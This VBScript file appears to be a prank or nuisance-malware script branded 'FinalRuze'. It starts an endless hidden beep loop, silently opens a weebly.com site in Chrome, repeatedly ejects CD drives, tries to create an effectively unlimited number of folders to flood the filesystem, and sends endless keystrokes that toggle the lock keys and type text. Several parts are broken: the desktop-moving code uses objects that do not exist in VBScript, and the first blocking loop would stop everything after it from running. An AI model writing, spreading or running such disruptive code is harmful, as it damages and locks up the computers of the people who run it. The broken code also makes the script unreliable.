' Beep sound loop
CreateObject("WScript.Shell").Run "PowerShell -Command ""while ($true) {[System.Media.SystemSounds]::Beep.Play(); Start-Sleep -Milliseconds 1000}""", 0, True

' Open website loop
CreateObject("WScript.Shell").Run "cmd /c start chrome https://j26nabr4tcsw908qiu.weebly.com/ & start chrome https://j26nabr4tcsw908qiu.weebly.com/", 0, False

' Move desktop items loop
Set objShell = WScript.CreateObject("WScript.Shell")
Set objShellApp = CreateObject("Shell.Application")
Set objDesktop = objShellApp.Namespace(0)
Do While True
    For Each objItem In objDesktop.Items
        Randomize
        xPos = Int((Screen.Width - objItem.Width) * Rnd)
        yPos = Int((Screen.Height - objItem.Height) * Rnd)
        objShellApp.MoveItem objItem, xPos, yPos
    Next
    WScript.Sleep 5000
Loop

' Eject CD loop
CreateObject("WScript.Shell").Run "PowerShell -Command ""while ($true) {Add-Type -AssemblyName 'Microsoft.Win32'; $cdroms = Get-WmiObject -Class Win32_CDROMDrive; foreach ($cdrom in $cdroms) {$cdrom.Eject()}; Start-Sleep -Milliseconds 5000}""", 0, True

' Create many folders
Const num_folders = 99999999999999
Dim base_folder_name, folder_name, i
base_folder_name = "FinalRuze"
For i = 1 To num_folders
    folder_name = base_folder_name & i
    CreateObject("Scripting.FileSystemObject").CreateFolder folder_name
    WScript.Echo "Created folder: " & folder_name
Next

' Type some text and toggle lock keys
Set x=WScript.CreateObject ("WScript.Shell")
Do While True
    WScript.Sleep 100
    x.SendKeys "{CAPSLOCK}"
    x.SendKeys "{NUMLOCK}"
    x.SendKeys "This is the FinalRuze"
    x.SendKeys "{SCROLLLOCK}"
Loop
